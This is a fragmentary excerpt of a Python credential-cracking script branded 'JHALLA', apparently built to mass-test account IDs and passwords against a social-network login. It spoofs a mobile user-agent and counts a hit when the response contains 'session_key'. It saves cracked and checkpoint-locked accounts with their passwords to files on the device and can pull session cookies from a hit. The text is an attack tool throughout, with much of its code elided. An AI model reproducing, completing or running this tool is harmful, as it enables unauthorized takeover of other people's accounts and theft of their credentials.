...
$$$$$$/ $$$$$$/ $$$$$$/                                                                         
===============================================   
\33[1;97m[+] Creater  : JHALLA
\33[1;97m[+] Version  : 1.3.0
\33[1;97m[+] GitHub   : SOON
===============================================   
'''
...
def method():
    ...
    def start(user):
     try:
        ...
        sys.stdout.write('\JHALLA\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
    ...
    "user-agent": 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
      ...
      #      print(response.text) 
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mJHALLA-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/JHALLA-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;91mJHALLA-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/JHALLA-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
    ...
    "user-agent": 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mJHALLA-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/JHALLA-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mJHALLA-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/JHALLA-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
...
def andom():
    ...
    print(f"{oo('•')}/sdcard/JHALLA-OK.txt")
    print('\033[1;93m='*25)
    print()    
    def start(user):
     try:
